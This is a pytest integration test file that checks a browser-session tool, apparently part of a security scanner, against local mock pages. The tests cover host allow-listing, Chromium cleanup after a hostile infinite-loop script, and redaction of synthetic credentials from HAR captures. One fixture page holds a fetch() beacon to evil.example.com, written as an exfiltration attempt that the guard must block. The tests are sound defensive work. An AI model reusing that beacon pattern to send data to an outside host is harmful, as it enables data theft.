"""End-to-end browser_session activity against a local SPA-like target (W1).

Real-browser tests are gated twice so CI without a browser skips cleanly:

1. ``pytest.importorskip("playwright.sync_api")`` — skips when the optional
   ``quarry[browser]`` extra is not installed.
2. ``QUARRY_BROWSER_TESTS=1`` — opt-in because the test launches real Chromium.

The gate is applied *per test* (via ``_require_browser``), not at module level, so
the no-browser tests (e.g. a disallowed host refused before any launch) still run
in the default suite.

Manual invocation:

    QUARRY_BROWSER_TESTS=1 uv run pytest tests/integration/test_browser_session_e2e.py

Drives the real activity path: ``open_url`` → ``get_dom`` (client-rendered
routes) → ``click`` → ``execute_js`` → ``screenshot`` (scrubbed
``ArtifactRef(kind=screenshot)``) → ``stop_har`` (scrubbed
``ArtifactRef(kind=har)``), and asserts the request-level host guard refuses a
disallowed host before any process is launched.
"""

from __future__ import annotations

import contextlib
import http.server
import json
import os
import signal
import threading
import time
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from quarry.schemas import ArtifactKind, RedactionStatus
from quarry_activities import browser_session as bs
from quarry_activities.browser_session import (
    BrowserSessionActivityInput,
    browser_session_impl,
)

#: Opt-in gate: real Chromium is launched, so real-browser tests only run when asked.
_BROWSER_TESTS_ENABLED = os.environ.get("QUARRY_BROWSER_TESTS") == "1"


def _require_browser() -> None:
    """Skip the calling test unless Playwright and the real-browser opt-in are present."""
    pytest.importorskip("playwright.sync_api")
    if not _BROWSER_TESTS_ENABLED:
        pytest.skip("set QUARRY_BROWSER_TESTS=1 to run real-browser tests")


@pytest.fixture(autouse=True)
def reset_sessions() -> Iterator[None]:
    """Close every browser session between tests.

    Without this, each test's Chromium tree lingers until process exit, so a
    later test's process-count baseline would include its siblings' browsers.
    """
    bs._STORE.clear()  # pyright: ignore[reportPrivateUsage]
    yield
    bs._STORE.clear()  # pyright: ignore[reportPrivateUsage]


#: A tiny "SPA": the home page renders a client-side router's routes into the DOM,
#: so get_dom proves the browser executed page JavaScript.
_SPA_HTML = """<!doctype html><html><body>
<h1 id="title">Demo SPA</h1>
<ul id="routes">
  <li class="route">/dashboard</li>
  <li class="route">/settings</li>
  <li class="route">/admin</li>
</ul>
<button id="go" onclick="document.getElementById('title').textContent='Clicked'">Go</button>
</body></html>"""

#: A page that tries to exfiltrate to a host outside allowed_hosts via fetch().
_BEACON_HTML = """<!doctype html><html><body><h1>Beacon</h1>
<script>
  fetch('http://evil.example.com/beacon').catch(() => {});
</script>
</body></html>"""


class _SpaHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002 - base API name
        return

    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        html = _BEACON_HTML if self.path == "/beacon" else _SPA_HTML
        data = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Set-Cookie", "session=e2e-secret-cookie; Path=/")
        self.end_headers()
        self.wfile.write(data)


@pytest.fixture()
def spa_server() -> Iterator[tuple[str, int]]:
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _SpaHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield str(server.server_address[0]), int(server.server_address[1])
    finally:
        server.shutdown()
        server.server_close()


def _open_input(
    host: str, port: int, tmp_path: Path, **overrides: Any
) -> BrowserSessionActivityInput:
    defaults: dict[str, Any] = {
        "action": "open_url",
        "url": f"http://{host}:{port}/",
        "allowed_hosts": (host,),
        "artifact_store_path": str(tmp_path / "artifacts"),
        "scan_id": "scan-e2e",
        "target_host": host,
        "target_port": port,
    }
    defaults.update(overrides)
    return BrowserSessionActivityInput(**defaults)


def test_full_spa_cycle_and_har(spa_server: tuple[str, int], tmp_path: Path) -> None:
    _require_browser()
    host, port = spa_server
    opened = browser_session_impl(_open_input(host, port, tmp_path, capture_har=True))
    assert opened["status"] == "ok"
    sid = opened["session_id"]

    dom = browser_session_impl(BrowserSessionActivityInput(action="get_dom", session_id=sid))
    assert "/dashboard" in dom["text"]

    clicked = browser_session_impl(
        BrowserSessionActivityInput(action="click", session_id=sid, selector="#go")
    )
    assert clicked["status"] == "ok"

    js = browser_session_impl(
        BrowserSessionActivityInput(
            action="execute_js", session_id=sid, script="document.querySelectorAll('.route').length"
        )
    )
    assert js["result"] == 3
    assert js["result_type"] == "number"

    cookies = browser_session_impl(
        BrowserSessionActivityInput(action="get_cookies", session_id=sid)
    )
    names = {c["name"] for c in cookies["cookies"]}
    assert "session" in names
    assert all("value" not in c for c in cookies["cookies"])

    shot = browser_session_impl(BrowserSessionActivityInput(action="screenshot", session_id=sid))
    assert shot["artifact"]["kind"] == ArtifactKind.SCREENSHOT.value

    har = browser_session_impl(BrowserSessionActivityInput(action="stop_har", session_id=sid))
    assert har["artifact"]["kind"] == ArtifactKind.HAR.value
    assert har["artifact"]["redaction_status"] in {
        RedactionStatus.REDACTED.value,
        RedactionStatus.NOT_REQUIRED.value,
    }
    stored = json.loads(Path(har["artifact"]["uri"].removeprefix("file://")).read_text())
    assert stored["log"]["version"] == "1.2"
    assert "e2e-secret-cookie" not in json.dumps(stored)


def test_disallowed_host_refused_before_launch(tmp_path: Path) -> None:
    result = browser_session_impl(
        BrowserSessionActivityInput(
            action="open_url",
            url="http://evil.example.com/",
            allowed_hosts=("localhost",),
            artifact_store_path=str(tmp_path),
            scan_id="scan-e2e",
        )
    )
    assert result["error"] == "host_denied"


def test_request_guard_blocks_exfil_beacon(spa_server: tuple[str, int], tmp_path: Path) -> None:
    """The request-level guard aborts a page's fetch() to a disallowed host."""
    _require_browser()
    host, port = spa_server
    opened = browser_session_impl(
        _open_input(host, port, tmp_path, url=f"http://{host}:{port}/beacon")
    )
    assert opened["status"] == "ok"
    assert opened["blocked_requests"] >= 1


def test_session_survives_cross_thread_actions(spa_server: tuple[str, int], tmp_path: Path) -> None:
    """A session opened on one thread is drivable from another (F3 regression).

    Temporal runs activities on an unpinned thread pool, so the session created in
    one invocation is driven from a different thread in the next. Playwright's sync
    API is thread-affine; the session-owned driver thread must absorb that.
    """
    _require_browser()
    host, port = spa_server
    opened = browser_session_impl(_open_input(host, port, tmp_path))
    assert opened["status"] == "ok"
    sid = opened["session_id"]

    results: dict[str, Any] = {}

    def _worker() -> None:
        results["dom"] = browser_session_impl(
            BrowserSessionActivityInput(action="get_dom", session_id=sid)
        )
        results["js"] = browser_session_impl(
            BrowserSessionActivityInput(
                action="execute_js",
                session_id=sid,
                script="document.querySelectorAll('.route').length",
            )
        )

    thread = threading.Thread(target=_worker)
    thread.start()
    thread.join()

    assert "/dashboard" in results["dom"]["text"]
    assert results["js"]["result"] == 3


# ---------------------------------------------------------------------------
# N1 (close-out t_6669f88a): the hostile-script wedge probe. A wedged
# execute_js must not leak the Chromium tree, burn deadlines on later actions,
# or stall teardown.
# ---------------------------------------------------------------------------

_HAS_PROC = os.path.isdir("/proc")


def _browser_tree_pids() -> list[int]:
    """Chromium-family processes descended from THIS test process.

    Scoped to descendants of the test process, so a co-tenant lane's browsers
    are never counted (or swept). Zombies carry an empty ``/proc/<pid>/cmdline``
    and are excluded naturally.
    """
    me = os.getpid()
    children: dict[int, list[int]] = {}
    browser_pids: set[int] = set()
    try:
        entries = list(os.scandir("/proc"))
    except OSError:
        return []
    for entry in entries:
        if not entry.name.isdigit():
            continue
        pid = int(entry.name)
        try:
            with open(f"/proc/{pid}/stat", "rb") as fh:
                stat = fh.read()
            fields = stat.rsplit(b")", 1)[1].split()
            ppid = int(fields[1])
            with open(f"/proc/{pid}/cmdline", "rb") as fh:
                cmdline = fh.read().decode("utf-8", "replace")
        except (OSError, IndexError, ValueError):
            continue
        children.setdefault(ppid, []).append(pid)
        if "chrom" in cmdline.lower():
            browser_pids.add(pid)
    tree: set[int] = set()
    frontier = [me]
    while frontier:
        pid = frontier.pop()
        if pid in tree:
            continue
        tree.add(pid)
        frontier.extend(children.get(pid, []))
    return sorted(browser_pids & tree)


def _kill_leftover_browsers() -> None:
    """Scoped teardown sweep: reap any Chromium this test process still owns.

    Protects the *pre-fix* code path (which leaks the wedged tree at full CPU)
    so a red run cannot poison the machine for the next test.
    """
    for pid in _browser_tree_pids():
        with contextlib.suppress(OSError, ProcessLookupError):
            os.kill(pid, signal.SIGKILL)


@pytest.mark.skipif(not _HAS_PROC, reason="process-tree probe requires /proc")
def test_wedged_execute_js_reclaims_chromium_tree(
    spa_server: tuple[str, int], tmp_path: Path
) -> None:
    """Hostile script: ``while (true) {}`` under a 1500 ms bound.

    The deadline must fire, the session's Chromium process tree must be
    reaped, and every later action on that session must fail fast with a named
    wedge error instead of burning the full per-action deadline.
    """
    _require_browser()
    host, port = spa_server
    baseline = _browser_tree_pids()
    try:
        opened = browser_session_impl(_open_input(host, port, tmp_path))
        assert opened["status"] == "ok"
        sid = opened["session_id"]
        running = _browser_tree_pids()
        assert len(running) > len(baseline), "Chromium tree must be running after open_url"

        started = time.monotonic()
        wedged = browser_session_impl(
            BrowserSessionActivityInput(
                action="execute_js",
                session_id=sid,
                script="while(true){}",
                timeout_ms=1500,
            )
        )
        elapsed = time.monotonic() - started
        assert wedged["error"] == "execute_js_timeout", wedged
        assert elapsed < 8.0, f"wedge deadline took {elapsed:.1f}s to fire"

        # The Chromium tree (renderer at ~100% CPU included) must be gone.
        reclaim_deadline = time.monotonic() + 15.0
        while time.monotonic() < reclaim_deadline:
            if _browser_tree_pids() == baseline:
                break
            time.sleep(0.25)
        assert _browser_tree_pids() == baseline, (
            "wedged session leaked its Chromium tree: "
            f"{[p for p in _browser_tree_pids() if p not in baseline]}"
        )

        # Post-wedge actions fail fast with the named session error.
        started = time.monotonic()
        after = browser_session_impl(BrowserSessionActivityInput(action="get_dom", session_id=sid))
        fast_elapsed = time.monotonic() - started
        assert after["error"] == "session_wedged", after
        assert fast_elapsed < 5.0, f"post-wedge action burned {fast_elapsed:.1f}s"

        # Teardown of the wedged session must not stall either.
        started = time.monotonic()
        bs._STORE.clear()  # pyright: ignore[reportPrivateUsage]
        clear_elapsed = time.monotonic() - started
        assert clear_elapsed < 10.0, f"wedged teardown stalled {clear_elapsed:.1f}s"
    finally:
        _kill_leftover_browsers()
        with contextlib.suppress(Exception):
            bs._STORE.clear()  # pyright: ignore[reportPrivateUsage]
        _kill_leftover_browsers()
    assert _browser_tree_pids() == baseline


# ---------------------------------------------------------------------------
# N2 (close-out t_6669f88a): opaque custom-header and localStorage
# credentials must not reach the stored HAR, and the redaction stamp must
# match stored reality.
# ---------------------------------------------------------------------------

_LS_SECRET = "LS-SYNTH-SECRET-5f6a7b8c9d"
_API_KEY_SECRET = "SYNTH-API-KEY-1122334455"
_AUTH_TOKEN_SECRET = "SYNTH-AUTH-TOKEN-9988776655"

_LEAK_LOGIN_HTML = f"""<!doctype html><html><body>
<script>
  localStorage.setItem('api_token', '{_LS_SECRET}');
  location.replace('/leak-dash?tok={_LS_SECRET}');
</script>
</body></html>"""

_LEAK_DASH_HTML = f"""<!doctype html><html><body><h1>Dash</h1>
<script>
  fetch('/api/thing', {{headers: {{
    'X-API-Key': '{_API_KEY_SECRET}',
    'X-Auth-Token': '{_AUTH_TOKEN_SECRET}',
  }}}}).catch(() => {{}});
</script>
</body></html>"""


class _LeakHandler(http.server.BaseHTTPRequestHandler):
    """Login flow that mints an opaque localStorage token and echoes it in a
    ``?tok=`` parameter while the dashboard fetches with custom auth headers."""

    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002 - base API name
        return

    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        if self.path == "/leak-login":
            self._send(200, _LEAK_LOGIN_HTML)
        elif self.path.startswith("/leak-dash"):
            self._send(200, _LEAK_DASH_HTML)
        elif self.path == "/api/thing":
            self._send(200, '{"ok": true}')
        elif self.path == "/plain":
            self._send(200, "<!doctype html><html><body><h1>Plain</h1></body></html>")
        else:
            self._send(404, "not found")

    def _send(self, code: int, body: str) -> None:
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


@pytest.fixture()
def leak_server() -> Iterator[tuple[str, int]]:
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _LeakHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield str(server.server_address[0]), int(server.server_address[1])
    finally:
        server.shutdown()
        server.server_close()


def test_har_custom_header_and_localstorage_redaction(
    leak_server: tuple[str, int], tmp_path: Path
) -> None:
    """The leak matrix from close-out t_6669f88a, replayed live.

    A login flow stashes a bearer token in localStorage and echoes it in a URL
    parameter; the dashboard fetches with X-API-Key/X-Auth-Token headers. None
    of the three synthetic credentials may reach the stored HAR, and the
    artifact's redaction stamp must describe the bytes actually stored.
    """
    _require_browser()
    host, port = leak_server
    opened = browser_session_impl(
        _open_input(host, port, tmp_path, url=f"http://{host}:{port}/leak-login", capture_har=True)
    )
    assert opened["status"] == "ok"
    sid = opened["session_id"]

    # Give the redirect + credentialed fetch time to land in the recorder.
    settled = browser_session_impl(
        BrowserSessionActivityInput(
            action="execute_js",
            session_id=sid,
            script="() => new Promise((resolve) => setTimeout(resolve, 800))",
        )
    )
    assert settled.get("result") == "null" or "result" in settled, settled

    har = browser_session_impl(BrowserSessionActivityInput(action="stop_har", session_id=sid))
    artifact = har["artifact"]
    assert artifact is not None
    assert artifact["kind"] == ArtifactKind.HAR.value
    stored_text = Path(artifact["uri"].removeprefix("file://")).read_text()
    # None of the three synthetic credentials may survive anywhere in the HAR.
    assert _API_KEY_SECRET not in stored_text, "X-API-Key value leaked into stored HAR"
    assert _AUTH_TOKEN_SECRET not in stored_text, "X-Auth-Token value leaked into stored HAR"
    assert _LS_SECRET not in stored_text, "localStorage token leaked into stored HAR"
    # Capture-boundary redaction fired for the custom headers...
    assert "REDACTED_CREDENTIAL" in stored_text
    # ...and the stamp describes the stored bytes (the LS token was scrubbed).
    assert artifact["redaction_status"] == RedactionStatus.REDACTED.value


def test_clean_har_is_stamped_not_required(leak_server: tuple[str, int], tmp_path: Path) -> None:
    """Stamp negative control: REDACTED only appears on actually-redacted bytes.

    A session whose traffic carries no credential headers and no registered
    secrets must store a HAR stamped NOT_REQUIRED containing no redaction
    placeholders at all. (Traffic that *does* carry credential headers gets
    capture-boundary placeholders unconditionally — the stamp describes the
    storage-boundary scrub pass, not the unconditional denylist.)
    """
    _require_browser()
    host, port = leak_server
    opened = browser_session_impl(
        _open_input(host, port, tmp_path, url=f"http://{host}:{port}/plain", capture_har=True)
    )
    assert opened["status"] == "ok"
    sid = opened["session_id"]
    har = browser_session_impl(BrowserSessionActivityInput(action="stop_har", session_id=sid))
    artifact = har["artifact"]
    assert artifact is not None
    stored_text = Path(artifact["uri"].removeprefix("file://")).read_text()
    assert artifact["redaction_status"] == RedactionStatus.NOT_REQUIRED.value
    assert "REDACTED" not in stored_text
